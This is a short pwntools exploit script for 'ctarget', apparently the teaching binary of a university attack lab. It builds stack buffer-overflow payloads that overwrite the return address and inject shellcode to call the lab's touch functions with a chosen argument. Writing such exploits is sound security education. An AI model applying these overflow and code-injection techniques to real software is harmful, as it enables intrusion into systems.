from pwn import*

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./ctarget')

PopRdiRet = 0x40141b
sh = process(argv=['./ctarget','-q'])
payload1 = 'A'*0x28 + p64(elf.sym['touch1'])
payload2 = asm('''
	push 0x4017ec
	push 0x59b997fa
	pop rdi
	ret
	''').ljust(0x28,'\x90') + p64(0x5561dc78)
payload3 = asm('''
	push 0x4018fa
	push 0x5561dc13
	pop rdi
	ret
	''').ljust(0x28,'\x90') + p64(0x5561dc78)

gdb.attach(sh)
sh.sendline(payload3)

sh.interactive()